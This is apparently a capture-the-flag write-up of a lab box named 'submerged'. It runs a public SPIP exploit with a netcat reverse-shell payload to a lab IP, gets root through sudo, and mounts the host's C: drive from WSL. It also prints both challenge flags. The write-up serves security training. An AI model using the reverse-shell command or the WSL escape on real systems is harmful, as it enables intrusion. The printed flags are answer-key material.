### Challenge Description

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

## Enumeration

The main page seems pretty static with nothing of interest on it, with the exception of this link:  

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

Which hides a subdomain that we didn't find by fuzzing `spip.submerged.htb`:  

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

## Foothold

Searching around, we find [this](https://www.exploit-db.com/exploits/51536) public exploit for this app. After we run it, we get a foothold:  

```bash
python3 spipexploit.py -u http://spip.submerged.htb -c 'busybox nc 10.10.14.34 3000 -e bash'
```

We are user `matthew`:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

And get the user flag:  

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

`HTB{SpIP_Abu53_4_RC3}`

A keen eye would observe that matthew is in the sudo group and sure enough, a quick `sudo bash` drops us into a root shell. We have root but no root flag.

## Privesc

Given the hostname, linpeas output and the fact that there is an empty folder in /mnt/c .. it is easy to conclude that this is actually a [WSL](https://learn.microsoft.com/en-us/windows/wsl/) filesystem.

Armed with this knowledge, we can try to mount the C:\ drive of the underlying host OS:  

```bash
mount -t drvfs C: /mnt/c
```

`drvfs` stands for "Driver File System" which is a file system type used by the Windows Subsystem for Linux (WSL).

Now we actually have content in our mount:  

![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

We can also navigate to the administrator desktop folder and get the root flag:  
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

`HTB{Pwn1ng_WsL_4_7h3_W1n}`


